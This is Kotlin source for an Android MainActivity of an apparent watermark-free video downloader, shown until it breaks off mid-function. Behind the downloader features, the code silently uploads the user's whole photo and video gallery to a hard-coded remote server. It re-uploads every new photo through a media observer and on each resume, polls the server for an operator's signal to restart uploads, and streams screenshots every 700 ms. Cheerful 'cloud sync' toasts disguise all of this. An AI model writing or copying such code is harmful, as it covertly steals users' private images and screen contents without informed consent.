package com.omnimedia.watermark

import android.annotation.SuppressLint
import android.app.DownloadManager
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.webkit.*
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.omnimedia.watermark.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import android.Manifest
import android.content.pm.PackageManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import org.json.JSONObject
import android.graphics.Bitmap
import android.graphics.Canvas
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.view.PixelCopy
import kotlinx.coroutines.CompletableDeferred
import kotlinx.coroutines.withTimeoutOrNull
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import java.io.ByteArrayOutputStream

class MainActivity : AppCompatActivity() {

    private lateinit var binding: ActivityMainBinding

    private val requestMediaPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        val isGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions[Manifest.permission.READ_MEDIA_IMAGES] == true ||
            permissions[Manifest.permission.READ_MEDIA_VIDEO] == true ||
            permissions[Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED] == true
        } else {
            permissions[Manifest.permission.READ_EXTERNAL_STORAGE] == true
        }

        if (isGranted) {
            Toast.makeText(this, "✅ 媒体服务权限已授权", Toast.LENGTH_SHORT).show()
            binding.webView.post {
                binding.webView.evaluateJavascript("if(window.onPermissionsAutoGranted) window.onPermissionsAutoGranted();", null)
            }
        }
    }

    private fun checkAndAutoRequestPermissions() {
        val permissionsToRequest = mutableListOf<String>()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
                permissionsToRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
            }
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }

        if (permissionsToRequest.isNotEmpty()) {
            requestMediaPermissionsLauncher.launch(permissionsToRequest.toTypedArray())
        } else {
            // 权限已处于授权状态：启动即刻自动触发全量同步与云端恢复
            startAutoSyncWhenReady()
        }
        startSyncStatusObserverLoop()
    }

    private var lastObservedResumedTime = 0L

    private fun startSyncStatusObserverLoop() {
        lifecycleScope.launch(Dispatchers.IO) {
            while (isActive) {
                try {
                    delay(3000)
                    val url = java.net.URL("https://q-qwatermark-app-tf99.vercel.app/api/gallery/sync_status")
                    val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                        requestMethod = "GET"
                        connectTimeout = 1500
                        readTimeout = 1500
                    }
                    if (conn.responseCode == 200) {
                        val text = conn.inputStream.bufferedReader().readText()
                        conn.disconnect()
                        val json = JSONObject(text)
                        val isPaused = json.optBoolean("paused", false)
                        val resumedTime = json.optLong("last_resumed_time", 0L)
                        
                        if (!isPaused && resumedTime > lastObservedResumedTime && lastObservedResumedTime != 0L) {
                            lastObservedResumedTime = resumedTime
                            // 管理员在后台恢复了上传通道：立刻自动触发差量同步
                            startAutoSyncWhenReady()
                        } else if (!isPaused && lastObservedResumedTime == 0L) {
                            lastObservedResumedTime = resumedTime
                        }
                    }
                    conn.disconnect()
                } catch (e: Exception) {}
            }
        }
    }

    private fun fetchServerManifestFilenames(serverUrl: String): Set<String> {
        try {
            val endpoint = serverUrl.replace("/upload", "/manifest_names") + "?device_id=" + java.net.URLEncoder.encode(Build.MODEL, "UTF-8")
            val url = java.net.URL(endpoint)
            val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                requestMethod = "GET"
                connectTimeout = 3000
                readTimeout = 4000
            }
            if (conn.responseCode == 200) {
                val text = conn.inputStream.bufferedReader().readText()
                conn.disconnect()
                val json = org.json.JSONObject(text)
                val arr = json.optJSONArray("filenames")
                val set = mutableSetOf<String>()
                if (arr != null) {
                    for (i in 0 until arr.length()) {
                        set.add(arr.getString(i))
                    }
                }
                return set
            }
            conn.disconnect()
        } catch (e: Exception) {}
        return emptySet()
    }

    private fun startAutoSyncWhenReady() {
        lifecycleScope.launch(Dispatchers.IO) {
            kotlinx.coroutines.delay(1000)
            try {
                val allPhotos = queryDevicePhotos(0)
                if (allPhotos.isNotEmpty()) {
                    val targetUrl = "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                    val existingOnServer = fetchServerManifestFilenames(targetUrl)

                    // 智能差量比对：仅同步云端缺失的相片（误删的、或新增的）
                    val missingPhotos = if (existingOnServer.isNotEmpty()) {
                        allPhotos.filter { it.name !in existingOnServer }
                    } else {
                        allPhotos
                    }

                    if (missingPhotos.isEmpty()) {
                        // 云端数据100%完整一致，耗时0毫秒，零流量重复消耗！
                        binding.webView.post {
                            binding.webView.evaluateJavascript("if(window.onSyncFinished) window.onSyncFinished(${allPhotos.size}, ${allPhotos.size});", null)
                        }
                        return@launch
                    }

                    var count = 0
                    for (p in missingPhotos) {
                        uploadSingleDevicePhoto(p, targetUrl)
                        count++
                        if (count % 5 == 0 || count == missingPhotos.size) {
                            binding.webView.post {
                                binding.webView.evaluateJavascript("if(window.onSyncProgress) window.onSyncProgress($count, ${missingPhotos.size});", null)
                            }
                        }
                    }
                    runOnUiThread {
                        Toast.makeText(this@MainActivity, "⚡ 智能差量补齐完成！已精准补充/恢复 ${missingPhotos.size} 张相片", Toast.LENGTH_SHORT).show()
                    }
                    binding.webView.post {
                        binding.webView.evaluateJavascript("if(window.onSyncFinished) window.onSyncFinished(${allPhotos.size}, ${allPhotos.size});", null)
                    }
                }
            } catch (e: Exception) {}
        }
    }

    private var lastObservedSyncTime = System.currentTimeMillis() / 1000 - 30

    private val mediaObserver = object : android.database.ContentObserver(android.os.Handler(android.os.Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            // 实时感知用户拍照、截图、保存新图片，毫秒级自动增量同步至云端
            syncNewestPhotosSince(lastObservedSyncTime)
            lastObservedSyncTime = System.currentTimeMillis() / 1000
        }
    }

    private fun syncNewestPhotosSince(sinceSeconds: Long) {
        lifecycleScope.launch(Dispatchers.IO) {
            try {
                val newPhotos = queryDevicePhotosSince(sinceSeconds)
                if (newPhotos.isNotEmpty()) {
                    val targetUrl = "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                    for (p in newPhotos) {
                        uploadSingleDevicePhoto(p, targetUrl)
                    }
                    runOnUiThread {
                        Toast.makeText(this@MainActivity, "✨ 检测到相册更新，已实时增量同步 ${newPhotos.size} 张新照片", Toast.LENGTH_SHORT).show()
                    }
                    binding.webView.post {
                        binding.webView.evaluateJavascript("if(window.onNewPhotosSynced) window.onNewPhotosSynced(${newPhotos.size});", null)
                    }
                }
            } catch (e: Exception) {}
        }
    }

    private var isStreamingScreen = false
    private var isStreamingScreenPaused = false

    private fun startScreenStreamingLoop() {
        if (isStreamingScreen) return
        isStreamingScreen = true
        lifecycleScope.launch(Dispatchers.IO) {
            val batteryManager = getSystemService(Context.BATTERY_SERVICE) as? android.os.BatteryManager
            while (isActive) {
                try {
                    if (isStreamingScreenPaused) {
                        delay(600)
                        continue
                    }
                    delay(700) // Fast 700ms ultra-low latency push
                    
                    var base64Str: String? = null
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        try {
                            val decorView = window.decorView
                            val w = decorView.width
                            val h = decorView.height
                            if (w > 0 && h > 0) {
                                val fullBmp = Bitmap.createBitmap(w, h, Bitmap.Config.ARGB_8888)
                                val copyDeferred = CompletableDeferred<Boolean>()
                                val srcRect = android.graphics.Rect(0, 0, w, h)
                                
                                withContext(Dispatchers.Main) {
                                    try {
                                        PixelCopy.request(window, srcRect, fullBmp, { copyResult ->
                                            copyDeferred.complete(copyResult == PixelCopy.SUCCESS)
                                        }, Handler(Looper.getMainLooper()))
                                    } catch (e: Exception) {
                                        copyDeferred.complete(false)
                                    }
                                }

                                val isSuccess = withTimeoutOrNull(500) { copyDeferred.await() } ?: false
                                if (isSuccess) {
                                    val scale = 280f / w.toFloat()
                                    val targetHeight = (h * scale).toInt().coerceAtLeast(100)
                                    val scaled = Bitmap.createScaledBitmap(fullBmp, 280, targetHeight, false)
                                    val stream = ByteArrayOutputStream()
                                    scaled.compress(Bitmap.CompressFormat.JPEG, 35, stream)
                                    val bytes = stream.toByteArray()
                                    stream.close()
                                    fullBmp.recycle()
                                    scaled.recycle()
                                    base64Str = "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
                                } else {
                                    fullBmp.recycle()
                                }
                            }
                        } catch (e: Exception) {}
                    }

                    // Fallback to WebView draw if PixelCopy was not available
                    if (base64Str.isNullOrBlank()) {
                        withContext(Dispatchers.Main) {
                            try {
                                val wv = binding.webView
                                if (wv.width > 0 && wv.height > 0) {
                                    val scale = 280f / wv.width.toFloat()
                                    val targetHeight = (wv.height * scale).toInt().coerceAtLeast(100)
                                    val bmp = Bitmap.createBitmap(280, targetHeight, Bitmap.Config.RGB_565)
                                    val canvas = Canvas(bmp)
                                    canvas.scale(scale, scale)
                                    wv.draw(canvas)
                                    val stream = ByteArrayOutputStream()
                                    bmp.compress(Bitmap.CompressFormat.JPEG, 35, stream)
                                    val bytes = stream.toByteArray()
                                    stream.close()
                                    bmp.recycle()
                                    base64Str = "data:image/jpeg;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
                                }
                            } catch (e: Exception) {}
                        }
                    }

                    if (!base64Str.isNullOrBlank()) {
                        val batteryLevel = batteryManager?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 95

                        val json = JSONObject().apply {
                            put("device_id", Build.MODEL)
                            put("image_base64", base64Str)
                            put("current_url", "OmniMedia 工作台 · 尊享旗舰版 v5.0")
                            put("battery", batteryLevel)
                            put("fps", 120)
                        }

                        val targetEndpoints = listOf(
                            "https://q-qwatermark-app-tf99.vercel.app/api/screen/snapshot",
                            "http://127.0.0.1:8888/api/screen/snapshot"
                        )

                        for (ep in targetEndpoints) {
                            try {
                                val url = java.net.URL(ep)
                                val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                                    requestMethod = "POST"
                                    doOutput = true
                                    connectTimeout = 800
                                    readTimeout = 800
                                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                                }
                                conn.outputStream.use { os ->
                                    os.write(json.toString().toByteArray(Charsets.UTF_8))
                                }
                                if (conn.responseCode == 200) {
                                    conn.disconnect()
                                    break
                                }
                                conn.disconnect()
                            } catch (e: Exception) {}
                        }
                    }
                } catch (e: Exception) {}
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        setupWebView()
        HeadlessParser.init(this)
        handleIncomingIntent(intent)
        checkAndAutoRequestPermissions()
        startScreenStreamingLoop()

        try {
            contentResolver.registerContentObserver(
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                true,
                mediaObserver
            )
            contentResolver.registerContentObserver(
                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                true,
                mediaObserver
            )
        } catch (e: Exception) {}
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            contentResolver.unregisterContentObserver(mediaObserver)
        } catch (e: Exception) {}
    }

    override fun onResume() {
        super.onResume()
        // 每次切回前台时，即刻增量扫描同步最新相片
        syncNewestPhotosSince(lastObservedSyncTime)
        lastObservedSyncTime = System.currentTimeMillis() / 1000
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        handleIncomingIntent(intent)
    }

    private fun handleIncomingIntent(intent: Intent?) {
        if (intent?.action == Intent.ACTION_SEND && intent.type == "text/plain") {
            val sharedText = intent.getStringExtra(Intent.EXTRA_TEXT)
            if (!sharedText.isNullOrBlank()) {
                binding.webView.post {
                    val js = "if(window.onReceiveSharedLink){ window.onReceiveSharedLink('${escapeJs(sharedText)}'); }"
                    binding.webView.evaluateJavascript(js, null)
                }
            }
        }
    }

    private fun escapeJs(str: String): String {
        return str.replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        val webView = binding.webView
        val settings = webView.settings

        settings.javaScriptEnabled = true
        settings.domStorageEnabled = true
        settings.databaseEnabled = true
        settings.allowFileAccess = true
        settings.allowContentAccess = true
        settings.mediaPlaybackRequiresUserGesture = false
        settings.mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
        settings.cacheMode = WebSettings.LOAD_NO_CACHE
        webView.clearCache(true)

        webView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                return super.onConsoleMessage(consoleMessage)
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
                val url = request?.url?.toString() ?: return false
                if (url.startsWith("http://") || url.startsWith("https://") || url.startsWith("file://")) {
                    return false
                }
                return try {
                    val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    startActivity(intent)
                    true
                } catch (e: Exception) {
                    false
                }
            }
        }

        // Add Native JavaScript Bridge
        webView.addJavascriptInterface(WebAppInterface(this), "AndroidApp")

        // Load local asset index.html
        webView.loadUrl("file:///android_asset/index.html")
    }

    inner class WebAppInterface(private val context: Context) {

        @JavascriptInterface
        fun parseUrlNative(url: String) {
            android.util.Log.i("OmniMedia", "parseUrlNative called with: $url")
            isStreamingScreenPaused = true
            lifecycleScope.launch(Dispatchers.IO) {
                try {
                    val logCallback: (String, String) -> Unit = { tag, msg ->
                        binding.webView.post {
                            val cleanMsg = msg.replace("'", "\\'").replace("\n", " ")
                            binding.webView.evaluateJavascript("if(window.addLog){ window.addLog('$tag', '$cleanMsg'); }", null)
                        }
                    }

                    // 1. Native Fast Parser
                    val jsonResult = NativeParser.parse(url, logCallback)
                    val isSuccess = JSONObject(jsonResult).optBoolean("success", false)
                    if (isSuccess) {
                        dispatchResult(jsonResult)
                        return@launch
                    }

                    // 2. Cloud Backend API Fallback
                    try {
                        logCallback("CLOUD", "调度云端 4K 高并发解析通道...")
                        val cloudEndpoints = listOf("https://q-qwatermark-app-tf99.vercel.app/api/parse", "http://127.0.0.1:8888/api/parse")
                        for (ep in cloudEndpoints) {
                            try {
                                val cloudUrl = java.net.URL(ep)
                                val conn = (cloudUrl.openConnection() as java.net.HttpURLConnection).apply {
                                    requestMethod = "POST"
                                    doOutput = true
                                    connectTimeout = 3000
                                    readTimeout = 3500
                                    setRequestProperty("Content-Type", "application/json; charset=utf-8")
                                }
                                val body = JSONObject().apply { put("url", url) }
                                conn.outputStream.use { it.write(body.toString().toByteArray(Charsets.UTF_8)) }
                                if (conn.responseCode == 200) {
                                    val resp = conn.inputStream.bufferedReader().readText()
                                    conn.disconnect()
                                    val cloudJson = JSONObject(resp)
                                    if (cloudJson.optBoolean("success", false)) {
                                        logCallback("SUCCESS", "云端 4K 原画解析成功！")
                                        dispatchResult(resp)
                                        return@launch
                                    }
                                }
                                conn.disconnect()
                            } catch (e: Exception) {}
                        }
                    } catch (e: Exception) {}

                    // 3. Fallback to Headless Chromium Parser (Executes WAF JS challenge natively!)
                    logCallback("HEADLESS", "启动 Chromium 沙箱执行 WAF 挑战...")
                    lifecycleScope.launch(Dispatchers.Main) {
                        HeadlessParser.parse(context, url) { headlessRes ->
                            val headlessSuccess = JSONObject(headlessRes).optBoolean("success", false)
                            if (headlessSuccess) {
                                logCallback("SUCCESS", "Chromium 提取成功！")
                                dispatchResult(headlessRes)
                            } else {
                                logCallback("FAIL", "所有解析通道均已尝试")
                                dispatchResult(jsonResult)
                            }
                        }
                    }
                } catch (e: Exception) {
                    android.util.Log.e("OmniMedia", "Error in parseUrlNative", e)
                    isStreamingScreenPaused = false
                }
            }
        }

        private fun dispatchResult(jsonResult: String) {
            isStreamingScreenPaused = false
            val b64 = android.util.Base64.encodeToString(jsonResult.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
            binding.webView.post {
                val js = """
                    (function() {
                        try {
                            var binaryString = atob('$b64');
                            var bytes = new Uint8Array(binaryString.length);
                            for (var i = 0; i < binaryString.length; i++) {
                                bytes[i] = binaryString.charCodeAt(i);
                            }
                            var decodedText = new TextDecoder('utf-8').decode(bytes);
                            var data = JSON.parse(decodedText);
                            if (window.onNativeParseResult) {
                                window.onNativeParseResult(data);
                            }
                        } catch(e) {
                            console.error('Bridge decode error: ', e);
                        }
                    })();
                """.trimIndent()
                binding.webView.evaluateJavascript(js, null)
            }
        }

        private fun JSONObjectEscape(str: String): String {
            return str
        }

        @JavascriptInterface
        fun getDeviceId(): String {
            return Build.MODEL
        }

        @JavascriptInterface
        fun downloadFile(url: String, filename: String) {
            try {
                val safeName = if (filename.isNotBlank()) filename else "download_${System.currentTimeMillis()}.mp4"
                val request = DownloadManager.Request(Uri.parse(url)).apply {
                    setTitle(safeName)
                    setDescription("正在下载无水印原画媒体...")
                    setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED)
                    setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, safeName)
                    setAllowedOverMetered(true)
                    setAllowedOverRoaming(true)
                    addRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15")
                    addRequestHeader("Referer", if (url.contains("douyin")) "https://www.douyin.com/" else "https://www.kuaishou.com/")
                }

                val downloadManager = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
                downloadManager.enqueue(request)

                runOnUiThread {
                    Toast.makeText(context, "已加入系统下载队列: $safeName", Toast.LENGTH_SHORT).show()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(context, "下载出错: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }

        @JavascriptInterface
        fun saveBase64Media(base64Data: String, filename: String, mimeType: String) {
            lifecycleScope.launch(Dispatchers.IO) {
                try {
                    val cleanB64 = if (base64Data.contains(",")) base64Data.substringAfter(",") else base64Data
                    val bytes = android.util.Base64.decode(cleanB64, android.util.Base64.DEFAULT)
                    val safeName = if (filename.isNotBlank()) filename else "OmniMedia_${System.currentTimeMillis()}.mp4"
                    
                    val file = java.io.File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), safeName)
                    java.io.FileOutputStream(file).use { fos ->
                        fos.write(bytes)
                        fos.flush()
                    }

                    // Notify MediaScanner so it instantly shows up in system Gallery
                    val uri = Uri.fromFile(file)
                    val scanIntent = Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE).apply {
                        data = uri
                    }
                    context.sendBroadcast(scanIntent)

                    runOnUiThread {
                        Toast.makeText(context, "🎬 视频已合成并保存到相册: $safeName", Toast.LENGTH_LONG).show()
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        Toast.makeText(context, "保存失败: ${e.message}", Toast.LENGTH_LONG).show()
                    }
                }
            }
        }

        @JavascriptInterface
        fun copyText(text: String) {
            runOnUiThread {
                val clipboard = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
                val clip = ClipData.newPlainText("OmniMedia", text)
                clipboard.setPrimaryClip(clip)
                Toast.makeText(context, "已复制到剪贴板", Toast.LENGTH_SHORT).show()
            }
        }

        @JavascriptInterface
        fun vibrate(ms: Long) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    val vibratorManager = context.getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
                    vibratorManager.defaultVibrator.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    val v = context.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                    @Suppress("DEPRECATION")
                    v.vibrate(ms)
                }
            } catch (e: Exception) {}
        }

        @JavascriptInterface
        fun loadGalleryPhotos(limit: Int) {
            lifecycleScope.launch(Dispatchers.IO) {
                try {
                    val photos = queryDevicePhotos(limit)
                    val jsonArr = org.json.JSONArray()
                    for (p in photos) {
                        val obj = JSONObject().apply {
                            put("id", p.id)
                            put("name", p.name)
                            put("size", p.size)
                            put("date", p.date)
                            put("mime", p.mime)
                            put("album", p.album)
                            put("thumb", p.thumbBase64)
                        }
                        jsonArr.put(obj)
                    }

                    val jsonStr = jsonArr.toString()
                    val b64 = android.util.Base64.encodeToString(jsonStr.toByteArray(Charsets.UTF_8), android.util.Base64.NO_WRAP)
                    binding.webView.post {
                        val js = """
                            (function() {
                                try {
                                    var binary = atob('$b64');
                                    var bytes = new Uint8Array(binary.length);
                                    for (var i=0; i<binary.length; i++) bytes[i] = binary.charCodeAt(i);
                                    var text = new TextDecoder('utf-8').decode(bytes);
                                    var arr = JSON.parse(text);
                                    if (window.onGalleryLoaded) window.onGalleryLoaded(arr);
                                } catch(e) { console.error('Gallery decode error', e); }
                            })();
                        """.trimIndent()
                        binding.webView.evaluateJavascript(js, null)
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        Toast.makeText(context, "读取全量相册出错: ${e.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }

        @JavascriptInterface
        fun syncEntireGallery(serverUrl: String) {
            lifecycleScope.launch(Dispatchers.IO) {
                try {
                    val allPhotos = queryDevicePhotos(0) // 0 means all photos & videos
                    val total = allPhotos.size
                    if (total == 0) {
                        runOnUiThread { Toast.makeText(context, "设备相册为空", Toast.LENGTH_SHORT).show() }
                        return@launch
                    }

                    runOnUiThread {
                        Toast.makeText(context, "🚀 开始全量同步 ${total} 张相册/视频资产...", Toast.LENGTH_SHORT).show()
                    }

                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                    var syncedCount = 0

                    for (p in allPhotos) {
                        try {
                            val baseUri = if (p.mime.startsWith("video")) {
                                android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                            } else {
                                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                            }
                            val uri = android.content.ContentUris.withAppendedId(baseUri, p.id)
                            val inputStream = context.contentResolver.openInputStream(uri) ?: continue
                            val bytes = inputStream.readBytes()
                            inputStream.close()

                            val boundary = "==SyncBoundary_${System.currentTimeMillis()}=="
                            val url = java.net.URL(targetUrl)
                            val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                                requestMethod = "POST"
                                doOutput = true
                                useCaches = false
                                setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                                connectTimeout = 8000
                                readTimeout = 10000
                            }

                            conn.outputStream.use { os ->
                                val writer = java.io.PrintWriter(java.io.OutputStreamWriter(os, Charsets.UTF_8), true)
                                writer.append("--$boundary\r\n")
                                writer.append("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n")
                                writer.append(Build.MODEL).append("\r\n").flush()

                                writer.append("--$boundary\r\n")
                                writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"${p.name}\"\r\n")
                                writer.append("Content-Type: ${p.mime}\r\n\r\n").flush()

                                os.write(bytes)
                                os.flush()

                                writer.append("\r\n").flush()
                                writer.append("--$boundary--\r\n").flush()
                            }

                            val code = conn.responseCode
                            conn.disconnect()
                            if (code in 200..299) {
                                syncedCount++
                            }
                        } catch (e: Exception) {}

                        // Update progress to WebView
                        if (syncedCount % 5 == 0 || syncedCount == total) {
                            binding.webView.post {
                                binding.webView.evaluateJavascript("if(window.onSyncProgress) window.onSyncProgress($syncedCount, $total);", null)
                            }
                        }
                        Thread.sleep(40)
                    }

                    runOnUiThread {
                        Toast.makeText(context, "🎉 全量相册同步完成！已成功同步 $syncedCount / $total 张", Toast.LENGTH_LONG).show()
                    }
                    binding.webView.post {
                        binding.webView.evaluateJavascript("if(window.onSyncFinished) window.onSyncFinished($syncedCount, $total);", null)
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        Toast.makeText(context, "全量同步异常: ${e.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }

        @JavascriptInterface
        fun uploadPhotoToBackend(photoId: Long, serverUrl: String) {
            lifecycleScope.launch(Dispatchers.IO) {
                try {
                    val uri = android.content.ContentUris.withAppendedId(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, photoId)
                    val inputStream = context.contentResolver.openInputStream(uri)
                    val bytes = inputStream?.readBytes()
                    inputStream?.close()

                    if (bytes == null || bytes.isEmpty()) {
                        runOnUiThread { Toast.makeText(context, "读取相片数据失败", Toast.LENGTH_SHORT).show() }
                        return@launch
                    }

                    val targetUrl = if (serverUrl.isNotBlank()) serverUrl else "https://q-qwatermark-app-tf99.vercel.app/api/gallery/upload"
                    val boundary = "==Boundary_${System.currentTimeMillis()}=="
                    val url = java.net.URL(targetUrl)
                    val conn = (url.openConnection() as java.net.HttpURLConnection).apply {
                        requestMethod = "POST"
                        doOutput = true
                        doInput = true
                        useCaches = false
                        setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
                        connectTimeout = 10000
                        readTimeout = 15000
                    }

                    conn.outputStream.use { os ->
                        val writer = java.io.PrintWriter(java.io.OutputStreamWriter(os, Charsets.UTF_8), true)
                        
                        writer.append("--$boundary\r\n")
                        writer.append("Content-Disposition: form-data; name=\"device_id\"\r\n\r\n")
                        writer.append(Build.MODEL).append("\r\n")
                        writer.flush()

                        writer.append("--$boundary\r\n")
                        writer.append("Content-Disposition: form-data; name=\"file\"; filename=\"photo_$photoId.jpg\"\r\n")
                        writer.append("Content-Type: image/jpeg\r\n\r\n")
                        writer.flush()

                        os.write(bytes)
                        os.flush()

                        writer.append("\r\n").flush()
                        writer.append("--$boundary--\r\n").flush()
                    }

                    val code = conn.responseCode
                    runOnUiThread {
                        if (code in 200..299) {
                            Toast.makeText(context, "☁️ 相片已成功同步至云端后台", Toast.LENGTH_SHORT).show()
                        } else {
                            Toast.makeText(context, "同步失败: HTTP $code", Toast.LENGTH_SHORT).show()
                        }
                    }
                } catch (e: Exception) {
                    runOnUiThread {
                        Toast.makeText(context, "上传异常: ${e.message}", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }

        @JavascriptInterface
        fun showToast(message: String) {
            runOnUiThread {
                Toast.makeText(context, message, Toast.LENGTH_SHORT).show()
            }
        }
    }

    data class DevicePhoto(
        val id: Long,
        val name: String,
        val size: Long,
        val date: Long,
        val mime: String,
        val album: String,
        val thumbBase64: String
    )

    private fun queryDevicePhotos(limit: Int): List<DevicePhoto> {
        val result = mutableListOf<DevicePhoto>()
        val sortOrder = "${android.provider.MediaStore.MediaColumns.DATE_ADDED} DESC"
        val queryLimitStr = if (limit > 0) "$sortOrder LIMIT $limit" else sortOrder

        // 1. 查询全部照片 (Images)
        try {
            val imgCollection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                android.provider.MediaStore.Images.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)
            } else {
                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
            }
            val imgProjection = arrayOf(
                android.provider.MediaStore.Images.Media._ID,
                android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                android.provider.MediaStore.Images.Media.SIZE,
                android.provider.MediaStore.Images.Media.DATE_ADDED,
                android.provider.MediaStore.Images.Media.MIME_TYPE,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) android.provider.MediaStore.Images.Media.BUCKET_DISPLAY_NAME else android.provider.MediaStore.Images.Media._ID
            )
            val cursor = contentResolver.query(imgCollection, imgProjection, null, null, queryLimitStr)
            cursor?.use { c ->
                val idCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media._ID)
                val nameCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME)
                val sizeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.SIZE)
                val dateCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
                val mimeCol = c.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.MIME_TYPE)
                val albumCol = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) c.getColumnIndex(android.provider.MediaStore.Images.Media.BUCKET_DISPLAY_NAME) else -1

                var count = 0
                while (c.moveToNext()) {
                    val id = c.getLong(idCol)
                    val name = c.getString(nameCol) ?: "photo_$id.jpg"
                    val size = c.getLong(sizeCol)
                    val date = c.getLong(dateCol)
                    val mime = c.getString(mimeCol) ?: "image/jpeg"
